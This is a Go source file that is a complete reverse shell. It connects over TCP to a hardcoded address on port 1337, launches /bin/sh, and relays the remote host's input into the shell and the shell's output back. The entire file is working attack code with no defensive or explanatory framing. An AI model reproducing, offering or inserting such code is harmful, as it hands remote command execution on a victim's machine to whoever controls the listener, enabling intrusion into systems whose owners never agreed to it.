package main

import (
	"net"
	"os/exec"
)

var Destination = "192.168.1.1:1337"
var Shell = "/bin/sh"
const BufferSize = 128

func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
	var cmd *exec.Cmd
	cmd = exec.Command(command)
	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	go func() {
		for {
			select {
			case incoming := <-recv:
				stdin.Write(incoming)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, BufferSize)
			stderr.Read(buf)
			send <- buf
		}
	}()

	cmd.Start()
	for {
		buf := make([]byte, BufferSize)
		stdout.Read(buf)
		send <- buf
	}
}

func main() {
	conn, _ := net.Dial("tcp", Destination)
	send := make(chan []byte)
	recv := make(chan []byte)

	go reverseShell(Shell, send, recv)

	go func() {
		for {
			data := make([]byte, BufferSize)
			conn.Read(data)
			recv <- data
		}
	}()

	for {
		select {
		case outgoing := <-send:
			conn.Write(outgoing)
		}
	}
}

